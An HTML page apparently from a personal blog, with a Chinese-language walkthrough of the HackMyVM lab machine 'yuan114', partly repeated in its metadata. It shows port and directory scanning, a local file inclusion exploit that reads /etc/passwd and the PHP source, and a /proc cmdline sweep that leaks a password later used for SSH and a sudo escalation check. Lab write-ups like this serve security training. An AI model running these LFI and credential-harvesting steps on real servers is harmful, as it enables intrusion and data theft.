@@ -1,0 +1,1249 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/61413445?v=4"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="一、信息收集
+1、nmap端口扫描
+```
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# nmap -sV -sC -p- 192.168.56.146                                
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-30 09:07 EDT
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 192.168.56.146
+Host is up (0.0014s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-title: Welcome
+|_http-server-header: Apache/2.4.62 (Debian)
+MAC Address: 08:00:27:AE:3A:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.39 seconds
+
+```
+
+2、gobuster目录扫描
+
+```
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# gobuster dir -u http://192.168.56.146 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,old,sql -t 50
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.56.146
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Extensions:              php,txt,html,bak,old,sql
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 279]
+/.hta.bak             (Status: 403) [Size: 279]
+/.hta.txt             (Status: 403) [Size: 279]
+/.hta.html            (Status: 403) [Size: 279]
+/.hta.php             (Status: 403) [Size: 279]
+/.hta.old             (Status: 403) [Size: 279]
+/.hta.sql             (Status: 403) [Size: 279]
+/.htaccess            (Status: 403) [Size: 279]
+/.htaccess.old        (Status: 403) [Size: 279]
+/.htaccess.sql        (Status: 403) [Size: 279]
+/.htaccess.html       (Status: 403) [Size: 279]
+/.htpasswd.php        (Status: 403) [Size: 279]
+/.htaccess.txt        (Status: 403) [Size: 279]
+/.htpasswd            (Status: 403) [Size: 279]
+/.htaccess.bak        (Status: 403) [Size: 279]
+/.htaccess.php        (Status: 403) [Size: 279]
+/.htpasswd.txt        (Status: 403) [Size: 279]
+/.htpasswd.html       (Status: 403) [Size: 279]
+/.htpasswd.bak        (Status: 403) [Size: 279]
+/.htpasswd.old        (Status: 403) [Size: 279]
+/.htpasswd.sql        (Status: 403) [Size: 279]
+/file.php             (Status: 500) [Size: 0]
+/index.html           (Status: 200) [Size: 615]
+/index.html           (Status: 200) [Size: 615]
+/server-status        (Status: 403) [Size: 279]
+Progress: 32291 / 32291 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+开放了22、80端口，且80端口存在/file.php-Status:500(内部服务器错误)
+
+
+二、漏洞复现
+```
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# curl 'http://192.168.56.146'                          
+<!DOCTYPE html>
+<html lang='en'>
+<head>
+    <meta charset='UTF-8'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <title>Welcome</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        h1 {
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Welcome to Maze-sec</h1>
+    <p>认识的人越多 我就越喜欢狗</p>
+</body>
+</html>
+   ```
+```
+ curl -i 'http://192.168.56.146/file.php' 
+HTTP/1.0 500 Internal Server Error
+Date: Tue, 30 Jun 2026 13:27:32 GMT
+Server: Apache/2.4.62 (Debian)
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=UTF-8
+```
+这个时候应该想到LFI（本地文件包含）漏洞，对其进行模糊测试
+
+```
+ffuf -u 'http://192.168.56.146/file.php?FUZZ=/etc/passwd' \
+  -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  -fs 0 -t 50
+```
+发现file返回响应
+
+```
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# curl -i 'http://192.168.56.146/file.php?file=/etc/passwd'
+HTTP/1.1 200 OK
+Date: Tue, 30 Jun 2026 13:40:57 GMT
+Server: Apache/2.4.62 (Debian)
+Vary: Accept-Encoding
+Content-Length: 1394
+Content-Type: text/html; charset=UTF-8
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
+ ```
+获得welcome用户，尝试读取/home/welcome/user.txt
+
+```
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# curl -i 'http://192.168.56.146/file.php?file=/home/welcome/user.txt'
+HTTP/1.1 200 OK
+Date: Tue, 30 Jun 2026 13:42:03 GMT
+Server: Apache/2.4.62 (Debian)
+Content-Length: 44
+Content-Type: text/html; charset=UTF-8
+
+flag{user-210f652e7e3b7e7359e523ef04e96295}
+```
+
+
+三、提权
+使用PHP过滤器读取源码
+
+```
+┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
+└─# curl -i 'http://192.168.56.146/file.php?file=php://filter/read=convert.base64-encode/resource=file.php'
+HTTP/1.1 200 OK
+Date: Tue, 30 Jun 2026 13:45:25 GMT
+Server: Apache/2.4.62 (Debian)
+Vary: Accept-Encoding
+Content-Length: 100
+Content-Type: text/html; charset=UTF-8
+
+PD9waHAKLy8gZmlsZS5waHAKJGZpbGUgPSAkX0dFVFsnZmlsZSddOwplY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKTsKPz4K                                                                                
+┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
+└─# curl -s 'http://192.168.56.146/file.php?file=php://filter/read=convert.base64-encode/resource=file.php' | base64 -d
+<?php
+// file.php
+$file = $_GET['file'];
+echo file_get_contents($file);
+?>
+```
+
+```
+for i in $(seq 1 1000); do
+  result=$(curl -s 'http://192.168.56.146/file.php?file=/proc/$i/cmdline' \
+    --output - | strings -1 | tr '\0' ' ')
+  [ -n '$result' ] && echo 'PID $i: $result'
+done
+
+
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# for i in $(seq 1 1000); do
+  result=$(curl -s 'http://192.168.56.146/file.php?file=/proc/$i/cmdline' \
+    --output - | strings -1 | tr '\0' ' ')
+  [ -n '$result' ] && echo 'PID $i: $result'
+done
+PID 1: /sbin/init
+PID 225: /lib/systemd/systemd-journald
+PID 249: /lib/systemd/systemd-udevd
+PID 275: /lib/systemd/systemd-timesyncd
+PID 316: /usr/sbin/cron
+-f
+PID 317: /usr/bin/dbus-daemon
+--system
+--address=systemd:
+--nofork
+--nopidfile
+--systemd-activation
+--syslog-only
+PID 318: /usr/sbin/rsyslogd
+-n
+-iNONE
+PID 319: /lib/systemd/systemd-logind
+PID 320: /lib/systemd/systemd-timesyncd
+PID 331: /usr/sbin/rsyslogd
+-n
+-iNONE
+PID 332: /usr/sbin/rsyslogd
+-n
+-iNONE
+PID 333: /usr/sbin/rsyslogd
+-n
+-iNONE
+PID 334: /sbin/dhclient
+-4
+-v
+-i
+-pf
+/run/dhclient.enp0s3.pid
+-lf
+/var/lib/dhcp/dhclient.enp0s3.leases
+-I
+-df
+/var/lib/dhcp/dhclient6.enp0s3.leases
+enp0s3
+PID 341: service --user welcome --password 6WXqj9Vc2tdXQ3TN0z54 --host localhost --port 8080
+infinity
+PID 349: /usr/bin/python3
+/usr/share/unattended-upgrades/unattended-upgrade-shutdown
+--wait-for-signal
+PID 352: /sbin/agetty
+-o
+-p -- 
+--noclear
+tty1
+linux
+PID 380: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+PID 405: /usr/sbin/apache2
+-k
+start
+PID 407: /usr/bin/python3
+/usr/share/unattended-upgrades/unattended-upgrade-shutdown
+--wait-for-signal
+
+```
+发现PID 341: service --user welcome --password 6WXqj9Vc2tdXQ3TN0z54 --host localhost --port 8080
+weclome:6WXqj9Vc2tdXQ3TN0z54
+
+ssh连接
+
+```
+ssh welcome@192.168.56.146
+
+```
+
+<img width='1321' height='440' alt='Image' src='https://github.com/user-attachments/assets/fed2a50e-04a9-410a-a98d-678e1546802d' />
+
+```
+welcome@114:~$ sudo -l
+Matching Defaults entries for welcome on 114:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User welcome may run the following commands on 114:
+    (ALL) NOPASSWD: /opt/read.sh
+    (ALL) NOPASSWD: /opt/short.sh
+welcome@114:~$ cat /opt/read.sh
+#!/bin/bash
+
+echo 'Input the flag:'
+if head -1 | grep -q '$(< /root/root.txt)'
+then
+        echo 'Y'
+else
+        echo 'N'
+fi
+welcome@114:~$ cat /opt/short.sh
+#!/bin/bash
+
+PATH=/usr/bin
+My_guess=$RANDOM
+
+echo 'This is script logic'
+cat << EOF
+if [ '$1' != '$My_guess' ] ;then
+    echo 'Nop'; 
+else
+    bash -i;
+fi
+EOF
+
+[ '$1' != '$My_guess' ] && echo 'Nop' || bash -i
+welcome@114:~$ 
+```
+原本 short.sh 脚本是让我们从 0~32767 去猜数字，但是如果我们传入字母去猜测（比如 HELLO），它只会判断为‘不等于’然后执行 echo 'Nop'，无法进入 shell。">
+<meta property="og:title" content="2026年6月30日-HackMyVm-yuan114靶机复盘">
+<meta property="og:description" content="一、信息收集
+1、nmap端口扫描
+```
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# nmap -sV -sC -p- 192.168.56.146                                
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-30 09:07 EDT
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 192.168.56.146
+Host is up (0.0014s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-title: Welcome
+|_http-server-header: Apache/2.4.62 (Debian)
+MAC Address: 08:00:27:AE:3A:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.39 seconds
+
+```
+
+2、gobuster目录扫描
+
+```
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# gobuster dir -u http://192.168.56.146 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,old,sql -t 50
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.56.146
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Extensions:              php,txt,html,bak,old,sql
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 279]
+/.hta.bak             (Status: 403) [Size: 279]
+/.hta.txt             (Status: 403) [Size: 279]
+/.hta.html            (Status: 403) [Size: 279]
+/.hta.php             (Status: 403) [Size: 279]
+/.hta.old             (Status: 403) [Size: 279]
+/.hta.sql             (Status: 403) [Size: 279]
+/.htaccess            (Status: 403) [Size: 279]
+/.htaccess.old        (Status: 403) [Size: 279]
+/.htaccess.sql        (Status: 403) [Size: 279]
+/.htaccess.html       (Status: 403) [Size: 279]
+/.htpasswd.php        (Status: 403) [Size: 279]
+/.htaccess.txt        (Status: 403) [Size: 279]
+/.htpasswd            (Status: 403) [Size: 279]
+/.htaccess.bak        (Status: 403) [Size: 279]
+/.htaccess.php        (Status: 403) [Size: 279]
+/.htpasswd.txt        (Status: 403) [Size: 279]
+/.htpasswd.html       (Status: 403) [Size: 279]
+/.htpasswd.bak        (Status: 403) [Size: 279]
+/.htpasswd.old        (Status: 403) [Size: 279]
+/.htpasswd.sql        (Status: 403) [Size: 279]
+/file.php             (Status: 500) [Size: 0]
+/index.html           (Status: 200) [Size: 615]
+/index.html           (Status: 200) [Size: 615]
+/server-status        (Status: 403) [Size: 279]
+Progress: 32291 / 32291 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+开放了22、80端口，且80端口存在/file.php-Status:500(内部服务器错误)
+
+
+二、漏洞复现
+```
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# curl 'http://192.168.56.146'                          
+<!DOCTYPE html>
+<html lang='en'>
+<head>
+    <meta charset='UTF-8'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <title>Welcome</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        h1 {
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Welcome to Maze-sec</h1>
+    <p>认识的人越多 我就越喜欢狗</p>
+</body>
+</html>
+   ```
+```
+ curl -i 'http://192.168.56.146/file.php' 
+HTTP/1.0 500 Internal Server Error
+Date: Tue, 30 Jun 2026 13:27:32 GMT
+Server: Apache/2.4.62 (Debian)
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=UTF-8
+```
+这个时候应该想到LFI（本地文件包含）漏洞，对其进行模糊测试
+
+```
+ffuf -u 'http://192.168.56.146/file.php?FUZZ=/etc/passwd' \
+  -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  -fs 0 -t 50
+```
+发现file返回响应
+
+```
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# curl -i 'http://192.168.56.146/file.php?file=/etc/passwd'
+HTTP/1.1 200 OK
+Date: Tue, 30 Jun 2026 13:40:57 GMT
+Server: Apache/2.4.62 (Debian)
+Vary: Accept-Encoding
+Content-Length: 1394
+Content-Type: text/html; charset=UTF-8
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
+ ```
+获得welcome用户，尝试读取/home/welcome/user.txt
+
+```
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# curl -i 'http://192.168.56.146/file.php?file=/home/welcome/user.txt'
+HTTP/1.1 200 OK
+Date: Tue, 30 Jun 2026 13:42:03 GMT
+Server: Apache/2.4.62 (Debian)
+Content-Length: 44
+Content-Type: text/html; charset=UTF-8
+
+flag{user-210f652e7e3b7e7359e523ef04e96295}
+```
+
+
+三、提权
+使用PHP过滤器读取源码
+
+```
+┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
+└─# curl -i 'http://192.168.56.146/file.php?file=php://filter/read=convert.base64-encode/resource=file.php'
+HTTP/1.1 200 OK
+Date: Tue, 30 Jun 2026 13:45:25 GMT
+Server: Apache/2.4.62 (Debian)
+Vary: Accept-Encoding
+Content-Length: 100
+Content-Type: text/html; charset=UTF-8
+
+PD9waHAKLy8gZmlsZS5waHAKJGZpbGUgPSAkX0dFVFsnZmlsZSddOwplY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKTsKPz4K                                                                                
+┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
+└─# curl -s 'http://192.168.56.146/file.php?file=php://filter/read=convert.base64-encode/resource=file.php' | base64 -d
+<?php
+// file.php
+$file = $_GET['file'];
+echo file_get_contents($file);
+?>
+```
+
+```
+for i in $(seq 1 1000); do
+  result=$(curl -s 'http://192.168.56.146/file.php?file=/proc/$i/cmdline' \
+    --output - | strings -1 | tr '\0' ' ')
+  [ -n '$result' ] && echo 'PID $i: $result'
+done
+
+
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# for i in $(seq 1 1000); do
+  result=$(curl -s 'http://192.168.56.146/file.php?file=/proc/$i/cmdline' \
+    --output - | strings -1 | tr '\0' ' ')
+  [ -n '$result' ] && echo 'PID $i: $result'
+done
+PID 1: /sbin/init
+PID 225: /lib/systemd/systemd-journald
+PID 249: /lib/systemd/systemd-udevd
+PID 275: /lib/systemd/systemd-timesyncd
+PID 316: /usr/sbin/cron
+-f
+PID 317: /usr/bin/dbus-daemon
+--system
+--address=systemd:
+--nofork
+--nopidfile
+--systemd-activation
+--syslog-only
+PID 318: /usr/sbin/rsyslogd
+-n
+-iNONE
+PID 319: /lib/systemd/systemd-logind
+PID 320: /lib/systemd/systemd-timesyncd
+PID 331: /usr/sbin/rsyslogd
+-n
+-iNONE
+PID 332: /usr/sbin/rsyslogd
+-n
+-iNONE
+PID 333: /usr/sbin/rsyslogd
+-n
+-iNONE
+PID 334: /sbin/dhclient
+-4
+-v
+-i
+-pf
+/run/dhclient.enp0s3.pid
+-lf
+/var/lib/dhcp/dhclient.enp0s3.leases
+-I
+-df
+/var/lib/dhcp/dhclient6.enp0s3.leases
+enp0s3
+PID 341: service --user welcome --password 6WXqj9Vc2tdXQ3TN0z54 --host localhost --port 8080
+infinity
+PID 349: /usr/bin/python3
+/usr/share/unattended-upgrades/unattended-upgrade-shutdown
+--wait-for-signal
+PID 352: /sbin/agetty
+-o
+-p -- 
+--noclear
+tty1
+linux
+PID 380: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+PID 405: /usr/sbin/apache2
+-k
+start
+PID 407: /usr/bin/python3
+/usr/share/unattended-upgrades/unattended-upgrade-shutdown
+--wait-for-signal
+
+```
+发现PID 341: service --user welcome --password 6WXqj9Vc2tdXQ3TN0z54 --host localhost --port 8080
+weclome:6WXqj9Vc2tdXQ3TN0z54
+
+ssh连接
+
+```
+ssh welcome@192.168.56.146
+
+```
+
+<img width='1321' height='440' alt='Image' src='https://github.com/user-attachments/assets/fed2a50e-04a9-410a-a98d-678e1546802d' />
+
+```
+welcome@114:~$ sudo -l
+Matching Defaults entries for welcome on 114:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User welcome may run the following commands on 114:
+    (ALL) NOPASSWD: /opt/read.sh
+    (ALL) NOPASSWD: /opt/short.sh
+welcome@114:~$ cat /opt/read.sh
+#!/bin/bash
+
+echo 'Input the flag:'
+if head -1 | grep -q '$(< /root/root.txt)'
+then
+        echo 'Y'
+else
+        echo 'N'
+fi
+welcome@114:~$ cat /opt/short.sh
+#!/bin/bash
+
+PATH=/usr/bin
+My_guess=$RANDOM
+
+echo 'This is script logic'
+cat << EOF
+if [ '$1' != '$My_guess' ] ;then
+    echo 'Nop'; 
+else
+    bash -i;
+fi
+EOF
+
+[ '$1' != '$My_guess' ] && echo 'Nop' || bash -i
+welcome@114:~$ 
+```
+原本 short.sh 脚本是让我们从 0~32767 去猜数字，但是如果我们传入字母去猜测（比如 HELLO），它只会判断为‘不等于’然后执行 echo 'Nop'，无法进入 shell。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://newSoloman.github.io/CS/post/2026-nian-6-yue-30-ri--HackMyVm-yuan114-ba-ji-fu-pan.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/61413445?v=4">
+<title>2026年6月30日-HackMyVm-yuan114靶机复盘</title>
+
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">2026年6月30日-HackMyVm-yuan114靶机复盘</h1>
+<div class="title-right">
+    <a href="https://newSoloman.github.io/CS" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/newSoloman/CS/issues/2" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><p>一、信息收集<br>
+1、nmap端口扫描</p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿kali)-[/home/kali/Desktop]
+└─# nmap -sV -sC -p- 192.168.56.146                                
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-30 09:07 EDT
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 192.168.56.146
+Host is up (0.0014s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-title: Welcome
+|_http-server-header: Apache/2.4.62 (Debian)
+MAC Address: 08:00:27:AE:3A:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.39 seconds
+
+</code></pre>
+<p>2、gobuster目录扫描</p>
+<pre class="notranslate"><code class="notranslate">┌──(root㉿kali)-[/home/kali/Desktop]
+└─# gobuster dir -u http://192.168.56.146 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,old,sql -t 50
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.56.146
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Extensions:              php,txt,html,bak,old,sql
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 279]
+/.hta.bak             (Status: 403) [Size: 279]
+/.hta.txt             (Status: 403) [Size: 279]
+/.hta.html            (Status: 403) [Size: 279]
+/.hta.php             (Status: 403) [Size: 279]
+/.hta.old             (Status: 403) [Size: 279]
+/.hta.sql             (Status: 403) [Size: 279]
+/.htaccess            (Status: 403) [Size: 279]
+/.htaccess.old        (Status: 403) [Size: 279]
+/.htaccess.sql        (Status: 403) [Size: 279]
+/.htaccess.html       (Status: 403) [Size: 279]
+/.htpasswd.php        (Status: 403) [Size: 279]
+/.htaccess.txt        (Status: 403) [Size: 279]
+/.htpasswd            (Status: 403) [Size: 279]
+/.htaccess.bak        (Status: 403) [Size: 279]
+/.htaccess.php        (Status: 403) [Size: 279]
+/.htpasswd.txt        (Status: 403) [Size: 279]
+/.htpasswd.html       (Status: 403) [Size: 279]
+/.htpasswd.bak        (Status: 403) [Size: 279]
+/.htpasswd.old        (Status: 403) [Size: 279]
+/.htpasswd.sql        (Status: 403) [Size: 279]
+/file.php             (Status: 500) [Size: 0]
+/index.html           (Status: 200) [Size: 615]
+/index.html           (Status: 200) [Size: 615]
+/server-status        (Status: 403) [Size: 279]
+Progress: 32291 / 32291 (100.00%)
+===============================================================
+Finished
+===============================================================
+</code></pre>
+<p>开放了22、80端口，且80端口存在/file.php-Status:500(内部服务器错误)</p>
+<p>二、漏洞复现</p>
